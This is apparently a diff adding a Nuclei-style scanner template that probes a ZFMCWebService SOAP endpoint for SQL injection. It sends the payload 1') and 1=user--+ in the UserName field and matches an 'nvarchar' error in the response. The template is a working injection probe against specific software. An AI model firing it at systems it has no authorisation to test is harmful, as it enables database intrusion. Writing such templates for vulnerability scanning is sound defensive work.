@@ -1,0 +1,33 @@
+
+id: lxtj-ZFMCWebService-sqli
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /ws/ZFMCWs/ZFMCWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://tempuri.org/UserInfo"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <UserInfo xmlns="http://tempuri.org/">
+            <UserName>1') and 1=user--+</UserName>
+            <DeptName>1</DeptName>
+          </UserInfo>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"nvarchar")
